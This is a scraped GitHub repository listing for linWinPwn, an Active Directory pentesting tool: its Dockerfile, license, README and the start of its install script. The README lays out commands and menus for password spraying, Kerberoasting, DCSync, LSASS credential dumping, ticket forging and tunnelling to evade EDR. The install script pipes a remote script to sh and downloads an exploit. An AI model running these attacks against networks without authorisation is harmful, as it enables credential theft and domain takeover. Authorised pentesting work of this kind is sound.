{
  "metadata": {
    "timestamp": 1736568460224,
    "page": 433,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQzOQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "lefayjey/linWinPwn",
      "stars": 1851,
      "defaultBranch": "main",
      "files": [
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 1.3408203125,
          "content": "# Use the official Ubuntu image as a base\nFROM ubuntu:latest\n\n# Install dependencies\nRUN apt update && apt install -y \\\n    sudo \\\n    wget \\\n    unzip \\\n    git \\\n    curl \\\n    && rm -rf /var/lib/apt/lists/*\n\n# Clone the linWinPwn repository\nRUN git clone https://github.com/lefayjey/linWinPwn /opt/linWinPwn\n\n# Make the install script executable\nRUN chmod +x /opt/linWinPwn/install.sh\n\n# Run the install script\nRUN /opt/linWinPwn/install.sh\n\n# Create wordlists directory\nRUN mkdir /opt/lwp-wordlists\n\n# Download and unzip rockyou wordlist \nRUN wget -q \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz\" -O \"/opt/lwp-wordlists/rockyou.txt.tar.gz\"\nRUN gunzip \"/opt/lwp-wordlists/rockyou.txt.tar.gz\"\nRUN tar xf \"/opt/lwp-wordlists/rockyou.txt.tar\" -C \"/opt/lwp-wordlists/\"\nRUN /bin/rm \"/opt/lwp-wordlists/rockyou.txt.tar\"\n\n# Download cirt usernames wordlist\nRUN wget -q \"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt\" -O \"/opt/lwp-wordlists/cirt-default-usernames.txt\"\n\n# Make the linWinPwn.sh script executable\nRUN chmod +x /opt/linWinPwn/linWinPwn.sh\n\n# Add /root/.local/bin to the PATH environment variable\nENV PATH=\"/root/.local/bin:${PATH}\"\n\n# Set the working directory\nWORKDIR /opt/linWinPwn\n\n# Set the default shell to bash\nENTRYPOINT [\"/bin/bash\"]"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0400390625,
          "content": "MIT License\n\nCopyright (c) 2021 lefayjey\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 22.962890625,
          "content": "# linWinPwn - Swiss-Army knife for Active Directory Pentesting using Linux\n\n## Description\n\nlinWinPwn is a bash script that wraps a number of Active Directory tools for enumeration (LDAP, RPC, ADCS, MSSQL, Kerberos), vulnerability checks (noPac, ZeroLogon, MS17-010, MS14-068), object modifications (password change, add user to group, RBCD, Shadow Credentials) and password dumping (secretsdump, lsassy, nanodump, DonPAPI). The script streamlines the use of a large number of tools: impacket, bloodhound, netexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound, bloodyAD, DonPAPI and many others. \n\n## Setup\n\nGit clone the repository and make the script executable\n```bash\ngit clone https://github.com/lefayjey/linWinPwn\ncd linWinPwn; chmod +x linWinPwn.sh\n```\n\nInstall requirements using the `install.sh` script (using standard account)\n```bash\nchmod +x install.sh\n./install.sh\n```\n\nAlternatively, build a Docker image and run the Docker container  \n```bash\ndocker build -t \"linwinpwn:latest\" .\ndocker run --rm -it linwinpwn:latest\n```\n\n## Usage\n\n### Mode\nThe linWinPwn script can be executed in interactive mode (default), or in automated mode (enumeration only).\n\n**1. Interactive Mode (Default)** - Open interactive menu to run checks separately\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> [-d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]> -A <AES_key> -C <cert[./cert.pfx]> -o <output_dir>]\n```\n\n**Tip:** Run linWinPwn using rlwrap for a better wrapping of commands\n`rlwrap -n ./linWinPwn.sh`\n\n**2. Automated Mode** - Using the `--auto` parameter, run enumeration tools (no exploitation, modifications or password dumping)\n\nWhen using the automated mode, different checks are performed based on the authentication method.\n\n- Unauthenticated (no credentials provided)\n    - Anonymous enumeration using netexec, enum4linux-ng, ldapdomaindump, ldeep\n    - RID bruteforce using netexec\n    - kerbrute user spray\n    - Pre2k authentication check on collected list of computers\n    - ASREPRoast using collected list of users (and cracking hashes using john-the-ripper and the rockyou wordlist)\n    - Blind Kerberoast\n    - CVE-2022-33679 exploit\n    - Check for DNS unsecure updates for AS-REQ abuse using krbjack\n    - SMB shares anonymous enumeration on identified servers\n    - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on identified servers\n    - Check for ms17-010, zerologon, petitpotam, nopac, smb-sigining, ntlmv1, runasppl weaknesses\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> --auto [-o <output_dir>]\n```\n\n- Authenticated (using password, NTLM hash, Kerberos ticket, AES key or pfx Certificate)\n    - DNS extraction using adidnsdump\n    - BloodHound data collection\n    - Enumeration using netexec, enum4linux-ng, ldapdomaindump, bloodyAD, sccmhunter, rdwatool, sccmhunter, GPOwned\n    - Generate wordlist for password cracking\n    - netexec find accounts with user=pass\n    - Pre2k authentication check on domain computers\n    - Extract ADCS information using certipy and certi.py\n    - kerbrute find accounts with user=pass\n    - ASREPRoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)\n    - Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)\n    - Targeted Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)\n    - SMB shares enumeration on all domain servers using smbmap, FindUncommonShares and cme's spider_plus\n    - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on all domain servers (using cme, Coercer and RPC Dump)\n    - Check for ms17-010, ms14-068, zerologon, petitpotam, nopac, smb-signing, ntlmv1, runasppl, certifried weaknesses\n    - Check mssql privilege escalation paths\n    - Check mssql relay possibilities\n```bash\nproxychains -q ./linWinPwn.sh -t <Domain_Controller_IP>  -d <AD_domain> -u <AD_user> [-p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]> -A <AES_key> -C <cert[./cert.pfx]>] [-o <output_dir>] --auto\n```\n\n### Parameters\n\n**Auto config** - Run NTP sync with target DC and add entry to /etc/hosts before running the modules\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> --auto-config\n```\n\n**LDAPS** - Use LDAPS instead of LDAP (port 636)\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> --ldaps\n```\n\n**Force Kerberos Auth** - Force using Kerberos authentication instead of NTLM (when possible)\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> --force-kerb\n```\n\n**Verbose** - Enable all verbose and debug outputs\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> --verbose\n```\n\n**Interface** - Choose attacker's network interface\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> -I tun0\n./linWinPwn.sh -t <Domain_Controller_IP> --interface eth0\n```\n\n**Targets** - Choose targets to be scanned (DC, All, IP=IP_or_hostname, File=./path_to_file)\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> --targets All\n./linWinPwn.sh -t <Domain_Controller_IP> --targets DC\n./linWinPwn.sh -t <Domain_Controller_IP> -T IP=192.168.0.1\n./linWinPwn.sh -t <Domain_Controller_IP> -T File=./list_servers.txt\n```\n\n**Custom wordlists** - Choose custom user and password wordlists\n\n```bash\n./linWinPwn.sh -t <Domain_Controller_IP> -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n./linWinPwn.sh -t <Domain_Controller_IP> -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt\n```\n\n### Tunneling\n\nlinWinPwn can be particularly useful when you have access to an Active Directory environment for a limited time only, and you wish to be more efficient in the enumeration process and in the collection of evidence.\nIn addition, linWinPwn can replace the use of enumeration tools on Windows in the aim of reducing the number of created artifacts (e.g., PowerShell commands, Windows Events, created files on disk), and bypassing certain Anti-Virus or EDRs. This can be achieved by performing remote dynamic port forwarding through the creation of an SSH tunnel from the Windows host (e.g., VDI machine or workstation or laptop) to a remote Linux machine (e.g., Pentest laptop or VPS), and running linWinPwn with proxychains.\n\nOn the Windows host, run using PowerShell:\n```powershell\nssh.exe kali@<linux_machine> -R 1080 -NCqf\n```\nOn the Linux machine, first update `/etc/proxychains4.conf` to include `socks5 127.0.0.1 1080`, then run:\n```bash\nproxychains -q ./linWinPwn.sh -t <Domain_Controller_IP>  -d <AD_domain> -u <AD_user> [-p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]> -A <AES_key> -C <cert[./cert.pfx]>] [-o <output_dir>] [--auto]\n```\n\n### Current supported authentications\n\n| Tool                    | Null Session | Password | NTLM Hash  | Kerberos Ticket| AES Key     | Certificate |\n|-------------------------|--------------|----------|------------|----------------|-------------|-------------|\n| `netexec`               | ✅           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `Impacket`              | ✅           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `adidnsdump`            | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `bloodhound-python`     | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `ldapdomaindump`        | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `enum4linux-ng`         | ✅           | ✅       | ✅        | ✅             | ❌         | ❌         |\n| `bloodyAD`              | ❌           | ✅       | ✅        | ✅             | ❌         | ✅         |\n| `SilentHound`           | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `ldeep`                 | ✅           | ✅       | ✅        | ✅             | ❌         | ✅         |\n| `windapsearch`          | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `LDAPWordlistHarvester` | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `LDAPConsole`           | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `pyLDAPmonitor`         | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `sccmhunter`            | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `ldapper`               | ❌           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `Adalanche`             | ❌           | ✅       | ✅        | ✅             | ❌         | ❌         |\n| `GPOwned`               | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `ACED`                  | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `adPEAS`                | ❌           | ✅       | ❌        | ❌             | ❌         | ❌         |\n| `breads`                | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `godap`                 | ✅           | ✅       | ✅        | ✅             | ❌         | ❌         |\n| `adcheck`               | ❌           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `certi.py`              | ❌           | ✅       | ✅        | ✅             | ✅         | ✅         |\n| `Certipy`               | ❌           | ✅       | ✅        | ✅             | ✅         | ✅         |\n| `certsync`              | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `pre2k`                 | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `orpheus`               | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `smbmap`                | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `FindUncommonShares`    | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `smbclient-ng`          | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `manspider`             | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `coercer`               | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `privexchange`          | ✅           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `RunFinger.py`          | ✅           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `mssqlrelay`            | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `targetedKerberoast`    | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `pygpoabuse`            | ❌           | ✅       | ✅        | ✅             | ❌         | ❌         |\n| `DonPAPI`               | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `hekatomb`              | ❌           | ✅       | ✅        | ❌             | ❌         | ❌         |\n| `ExtractBitlockerKeys`  | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n| `evilwinrm`             | ❌           | ✅       | ✅        | ✅             | ✅         | ✅         |\n| `mssqlpwner`            | ❌           | ✅       | ✅        | ✅             | ✅         | ❌         |\n\n#### LDAP Channel Binding support\nldap3: ldapdomaindump (NTLM), Certipy, pre2k, bloodhound, ldeep\nmsldap: bloodyAD\n\n### Interactive Mode Menus\n\nMain menu\n```\n1) Run DNS Enumeration using adidnsdump\n2) Active Directory Enumeration Menu\n3) ADCS Enumeration Menu\n4) Brute Force Attacks Menu\n5) Kerberos Attacks Menu\n6) SMB shares Enumeration Menu\n7) Vulnerability Checks Menu\n8) MSSQL Enumeration Menu\n9) Password Dump Menu\n10) AD Objects or Attributes Modification Menu\n```\n\nAD Enum menu\n```\n1) BloodHound Enumeration using all collection methods (Noisy!)\n2) BloodHound Enumeration using DCOnly\n1bis) BloodHoundCE Enumeration using all collection methods (Noisy!)\n2bis) BloodHoundCE Enumeration using DCOnly\n3) ldapdomaindump LDAP Enumeration\n4) enum4linux-ng LDAP-MS-RPC Enumeration\n5) GPP Enumeration using netexec\n6) MS-RPC Enumeration using netexec (Users, pass pol)\n7) LDAP Enumeration using netexec (Users, passnotreq, userdesc, maq, ldap-checker, subnets)\n8) Delegation Enumeration using findDelegation and netexec\n9) bloodyAD All Enumeration\n10) bloodyAD write rights Enumeration\n11) bloodyAD query DNS server\n12) SilentHound LDAP Enumeration\n13) ldeep LDAP Enumeration\n14) windapsearch LDAP Enumeration\n15) LDAP Wordlist Harvester\n16) LDAP Enumeration using LDAPPER\n17) Adalanche Enumeration\n18) GPO Enumeration using GPOwned\n19) Enumeration of RDWA servers\n20) SCCM Enumeration using netexec\n21) SCCM Enumeration using sccmhunter\n22) Open p0dalirius' LDAP Console\n23) Open p0dalirius' LDAP Monitor\n24) Open garrettfoster13's ACED console\n25) Open LDAPPER custom options\n26) Open breads console\n27) Run godap console\n28) Run adPEAS enumerations\n29) Run ADCheck enumerations\n```\n\nADCS menu\n```\n1) ADCS Enumeration using netexec\n2) certi.py ADCS Enumeration\n3) Certipy ADCS Enumeration\n4) Certifried check\n5) Certipy LDAP shell via Schannel (using Certificate Authentication)\n6) Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)\n7) Dump LSASS using masky\n8) Dump NTDS using certsync\n```\n\nBruteForce menu\n```\n1) RID Brute Force (Null session) using netexec\n2) User Enumeration using kerbrute (Null session)\n3) User=Pass check using kerbrute (Noisy!)\n4) User=Pass check using netexec (Noisy!)\n5) Identify Pre-Created Computer Accounts using netexec (Noisy!)\n6) Pre2k computers authentication check (Noisy!)\n7) User Enumeration using ldapnomnom (Null session)\n8) Password spraying using kerbrute (Noisy!)\n9) Password spraying using netexec - ldap (Noisy!)\n10) Timeroast attack against NTP\n```\n\nKerberos Attacks menu\n```\n1) AS REP Roasting Attack using GetNPUsers\n2) Kerberoast Attack using GetUserSPNs\n3) Cracking AS REP Roast hashes using john the ripper\n4) Cracking Kerberoast hashes using john the ripper\n5) NoPac check using netexec (only on DC)\n6) MS14-068 check (only on DC)\n7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)\n8) AP-REQ hijack with DNS unsecure updates abuse using krbjack\n9) Run custom Kerberoast attack using Orpheus\n10) Request TGS for current user (requires: authenticated)\n11) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)\n12) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)\n13) Request ticket for another user using S4U2self (OPSEC alternative to Silver Ticket) (requires: authenticated session of SPN service account, for example 'svc')\n14) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)\n15) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)\n16) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)\n17) Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')\n```\n\nSMB Shares menu\n```\n1) SMB shares Scan using smbmap\n2) SMB shares Enumeration using netexec\n3) SMB shares Spidering using netexec \n4) SMB shares Scan using FindUncommonShares\n5) SMB shares Scan using manspider\n6) Open smbclient.py console on target\n7) Open p0dalirius's smbclientng console on target\n```\n\nVuln Checks menu\n```\n1) zerologon check using netexec (only on DC)\n2) MS17-010 check using netexec\n3) Print Spooler check using netexec\n4) Printnightmare check using netexec\n5) WebDAV check using netexec\n6) shadowcoerce check using netexec\n7) SMB signing check using netexec\n8) ntlmv1 check using netexec\n9) runasppl check using netexec\n10) smbghost check using netexec\n11) RPC Dump and check for interesting protocols\n12) Coercer RPC scan\n13) PushSubscription abuse using PrivExchange\n14) RunFinger scan\n15) Run LDAPNightmare check\n```\n\nMSSQL Enumeration menu\n```\n1) MSSQL Enumeration using netexec\n2) MSSQL Relay check\n3) Open mssqlclient.py console on target\n4) Open mssqlpwner in interactive mode\n```\n\nPassword Dump menu\n```\n1) LAPS Dump using netexec\n2) gMSA Dump using netexec\n3) DCSync using secretsdump (only on DC)\n4) Dump SAM and LSA using secretsdump\n5) Dump SAM and SYSTEM using reg\n6) Dump NTDS using netexec\n7) Dump SAM using netexec\n8) Dump LSA secrets using netexec\n9) Dump LSASS using lsassy\n10) Dump LSASS using handlekatz\n11) Dump LSASS using procdump\n12) Dump LSASS using nanodump\n13) Dump dpapi secrets using netexec\n14) Dump secrets using DonPAPI\n15) Dump secrets using hekatomb (only on DC)\n16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)\n17) Dump Veeam credentials (only from Veeam server)\n18) Dump Msol password (only from Azure AD-Connect server)\n19) Extract Bitlocker Keys\n```\n\nCommand Execution menu\n```\n1) Open CMD console using smbexec on target\n2) Open CMD console using wmiexec on target\n3) Open CMD console using psexec on target\n4) Open PowerShell console using evil-winrm on target\n```\n\nModification menu\n```\n1) Change user or computer password (Requires: ForceChangePassword on user or computer)\n2) Add user to group (Requires: GenericWrite or GenericAll on group)\n3) Add new computer (Requires: MAQ > 0)\n4) Add new DNS entry\n5) Change Owner of target (Requires: WriteOwner permission)\n6) Add GenericAll rights on target (Requires: Owner permission)\n7) Targeted Kerberoast Attack (Noisy!)\n8) Perform RBCD attack (Requires: GenericWrite or GenericAll or AllowedToAct on computer)\n9) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)\n10) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)\n11) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)\n12) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)\n13) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)\n14) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: GenericWrite or GenericAll on user)\n15) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)\n16) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)\n```\n\nAuth menu\n```\n1) Generate and use NTLM hash of current user (requires: password) - Pass the hash\n2) Crack NTLM hash of current user and use password (requires: NTLM hash)\n3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash\n4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)\n5) Request and use certificate (requires: authentication)\n6) Generate AES Key using aesKrbKeyGen (requires: password)\n```\n\nConfig menu\n```\n1) Check installation of tools and dependencies\n2) Synchronize time with Domain Controller (requires root)\n3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)\n4) Update resolv.conf to define Domain Controller as DNS server (requires root)\n5) Update krb5.conf to define realm and KDC for Kerberos (requires root)\n6) Download default username and password wordlists (non-kali machines)\n7) Change users wordlist file\n8) Change passwords wordlist file\n9) Change attacker's IP\n10) Switch between LDAP (port 389) and LDAPS (port 636)\n11) Show session information\n```\n\n## Demos\n- HackTheBox Forest\n\nInteractive Mode:\n[![asciicast](https://asciinema.org/a/499893.svg)](https://asciinema.org/a/499893)\n\nAutomated Mode:\n[![asciicast](https://asciinema.org/a/464904.svg)](https://asciinema.org/a/464904)\n\n- TryHackme AttacktiveDirectory\n\n[![asciicast](https://asciinema.org/a/464901.svg)](https://asciinema.org/a/464901)\n\n## TO DO\n\n- Add more enumeration and exploitation tools...\n\n## Credits\n\n- Inspiration: [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t) - WinPwn\n- Tools: \n    - [fortra](https://github.com/fortra) - impacket\n    - [NeffIsBack, Marshall-Hallenbeck, zblurx, mpgn, byt3bl33d3r and all contributors](https://github.com/Pennyw0rth/NetExec) - crackmapexec/netexec\n    - [Fox-IT](https://github.com/fox-it) - bloodhound-python\n    - [dirkjanm](https://github.com/dirkjanm/) - ldapdomaindump, adidnsdump, privexchange\n    - [zer1t0](https://github.com/zer1t0) - certi.py\n    - [ly4k](https://github.com/ly4k) - Certipy\n    - [ShawnDEvans](https://github.com/ShawnDEvans) - smbmap\n    - [ropnop](https://github.com/ropnop) - windapsearch, kerbrute\n    - [login-securite](https://github.com/login-securite) - DonPAPI\n    - [Processus-Thief](https://github.com/Processus-Thief) - HEKATOMB\n    - [layer8secure](https://github.com/layer8secure) - SilentHound\n    - [ShutdownRepo](https://github.com/ShutdownRepo) - TargetedKerberoast\n    - [franc-pentest](https://github.com/franc-pentest) - ldeep\n    - [garrettfoster13](https://github.com/garrettfoster13/) - pre2k, aced, sccmhunter\n    - [zblurx](https://github.com/zblurx/) - certsync\n    - [p0dalirius](https://github.com/p0dalirius) - Coercer, FindUncommonShares, ExtractBitlockerKeys, LDAPWordlistHarvester, ldapconsole, pyLDAPmonitor, RDWAtool, smbclient-ng\n    - [blacklanternsecurity](https://github.com/blacklanternsecurity/) - MANSPIDER\n    - [CravateRouge](https://github.com/CravateRouge) - bloodyAD\n    - [shellster](https://github.com/shellster) - LDAPPER\n    - [TrustedSec](https://github.com/trustedsec) - orpheus\n    - [lkarlslund](https://github.com/lkarlslund) - Adalanche\n    - [X-C3LL](https://github.com/X-C3LL) - GPOwned\n    - [Hackndo](https://github.com/Hackndo) - pyGPOAbuse\n    - [CompassSecurity](https://github.com/CompassSecurity) - mssqlrelay\n    - [lgandx](https://github.com/lgandx) - Responder\n    - [ajm4n](https://github.com/ajm4n) - adPEAS\n    - [oppsec](https://github.com/oppsec) - breads\n    - [CobblePot59](https://github.com/CobblePot59) - ADcheck\n    - [lkarlslund](https://github.com/lkarlslund) - ldapnomnom\n    - [Macmod](https://github.com/Macmod) - godap\n    - [ScorpionesLabs](https://github.com/ScorpionesLabs) - MSSqlPwner\n    - [barcrange](https://github.com/barcrange) - CVE-2024-49113-Checker\n\n- References:\n    -  https://orange-cyberdefense.github.io/ocd-mindmaps/\n    -  https://github.com/swisskyrepo/PayloadsAllTheThings\n    -  https://book.hacktricks.xyz/\n    -  https://adsecurity.org/\n    -  https://casvancooten.com/\n    -  https://www.thehacker.recipes/\n    -  https://www.ired.team/\n    -  https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet\n    -  https://hideandsec.sh/\n\n## Legal Disclamer\n\nUsage of linWinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.\n"
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 10.0361328125,
          "content": "#!/bin/bash\n#\n# Author: lefayjey\n# GNU/Linux Distro and Rust detection: ReK2, Hispagatos\n#\n\nRED='\\033[1;31m'\nGREEN='\\033[1;32m'\nBLUE='\\033[1;34m'\nNC='\\033[0m'\n\nscripts_dir=\"/opt/lwp-scripts\"\n\n# Detect Linux Distribution\nif command -v apt-get >/dev/null; then\n    PKG_MANAGER=\"apt-get\"\n    PACKAGES=\"python3 python3-dev python3-pip python3-venv nmap smbmap john libsasl2-dev libldap2-dev libkrb5-dev ntpdate wget zip unzip systemd-timesyncd pipx swig curl jq openssl rlwrap\"\nelif command -v pacman >/dev/null; then\n    PKG_MANAGER=\"pacman\"\n    PACKAGES=\"python python-pip python-virtualenv nmap smbmap john libsasl openldap krb5 ntp wget zip unzip systemd python-pipx swig curl jq openssl\"\nelse\n    echo -e \"${RED}[Error]${NC} Unsupported Linux distribution\"\n    exit 1\nfi\n\ninstall_tools() {\n    if [[ \"$PKG_MANAGER\" == \"apt-get\" ]]; then\n        echo -e \"${BLUE}Installing tools using apt...${NC}\"\n        sudo apt-get update && sudo apt-get install -y $PACKAGES\n    elif [[ \"$PKG_MANAGER\" == \"pacman\" ]]; then\n        echo -e \"${BLUE}Installing tools using pacman...${NC}\"\n        sudo pacman -Sy --needed --noconfirm $PACKAGES\n    fi\n\n    echo -e \"\"\n    # Check if Rust is installed, and install if it's missing\n    if ! command -v rustc >/dev/null; then\n        echo -e \"${BLUE}Rust not found, installing Rust...${NC}\"\n        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y\n        source ~/.cargo/env\n        echo -e \"${GREEN}Rust installed successfully.${NC}\"\n    else\n        echo -e \"${GREEN}Rust is already installed.${NC}\"\n    fi \n\n    echo -e \"\"\n    echo -e \"${BLUE}Installing python tools using pip and pipx...${NC}\"\n    pipx ensurepath\n    #pipx install git+https://github.com/deadjakk/ldapdomaindump --force #LDAP Channel Binding\n    #/home/$(whoami)/.local/share/pipx/venvs/ldapdomaindump/bin/python3 -m pip install git+https://github.com/ly4k/ldap3 #LDAP Channel Binding\n    pipx install git+https://github.com/dirkjanm/ldapdomaindump.git --force\n    pipx install git+https://github.com/Pennyw0rth/NetExec.git --force\n    pipx install git+https://github.com/fortra/impacket.git --force\n    pipx install git+https://github.com/dirkjanm/adidnsdump.git --force\n    pipx install git+https://github.com/zer1t0/certi.git --force\n    pipx install git+https://github.com/ly4k/Certipy.git --force\n    #pipx install git+https://github.com/zimedev/certipy-merged --force #Certipy with more features\n    #/home$(whoami)/.local/share/pipx/venvs/certipy-ad/bin/python3 -m pip install git+https://github.com/ly4k/ldap3 #LDAP Channel Binding\n    #pipx install git+https://github.com/deadjakk/BloodHound.py --force #LDAP Channel Binding\n    #/home/$(whoami)/.local/share/pipx/venvs/bloodhound/bin/python3 -m pip install git+https://github.com/ly4k/ldap3 #LDAP Channel Binding\n    pipx install git+https://github.com/dirkjanm/Bloodhound.py --force\n    pipx install \"git+https://github.com/dirkjanm/BloodHound.py@bloodhound-ce\" --force --suffix '_ce'\n    pipx install git+https://github.com/franc-pentest/ldeep.git --force\n    pipx install git+https://github.com/garrettfoster13/pre2k.git --force\n    pipx install git+https://github.com/zblurx/certsync.git --force\n    pipx install hekatomb --force\n    pipx install git+https://github.com/blacklanternsecurity/MANSPIDER --force\n    pipx install git+https://github.com/p0dalirius/Coercer --force\n    pipx install git+https://github.com/CravateRouge/bloodyAD --force\n    pipx install git+https://github.com/login-securite/DonPAPI --force\n    pipx install git+https://github.com/p0dalirius/RDWAtool --force\n    pipx install git+https://github.com/almandin/krbjack --force\n    pipx install git+https://github.com/CompassSecurity/mssqlrelay.git --force\n    pipx install git+https://github.com/CobblePot59/ADcheck.git --force\n    pipx install git+https://github.com/ajm4n/adPEAS --force\n    pipx install git+https://github.com/oppsec/breads.git --force\n    pipx install git+https://github.com/p0dalirius/smbclient-ng --force\n    pipx install 'git+https://github.com/ScorpionesLabs/MSSqlPwner.git' --force\n\n    echo -e \"\"\n    echo -e \"${BLUE}Downloading tools and scripts using wget and unzipping...${NC}\"\n    sudo mkdir -p ${scripts_dir}\n    sudo mkdir -p ${scripts_dir}/ldapper\n    sudo mkdir -p ${scripts_dir}/Responder\n    sudo chown -R \"$(whoami)\":\"$(whoami)\" ${scripts_dir}\n    python3 -m venv \"${scripts_dir}/.venv\"\n    source \"${scripts_dir}/.venv/bin/activate\"\n    pip3 install PyYAML alive-progress xlsxwriter sectools typer colorama impacket tabulate arc4 msldap pandas requests requests_ntlm requests_toolbelt cmd2 pycryptodome --upgrade\n    deactivate\n    \n    wget -q \"https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64\" -O \"$scripts_dir/windapsearch\"\n    wget -q \"https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64\" -O \"$scripts_dir/kerbrute\"\n    wget -q \"https://raw.githubusercontent.com/cddmp/enum4linux-ng/master/enum4linux-ng.py\" -O \"$scripts_dir/enum4linux-ng.py\"\n    wget -q \"https://raw.githubusercontent.com/Bdenneu/CVE-2022-33679/main/CVE-2022-33679.py\" -O \"$scripts_dir/CVE-2022-33679.py\"\n    wget -q 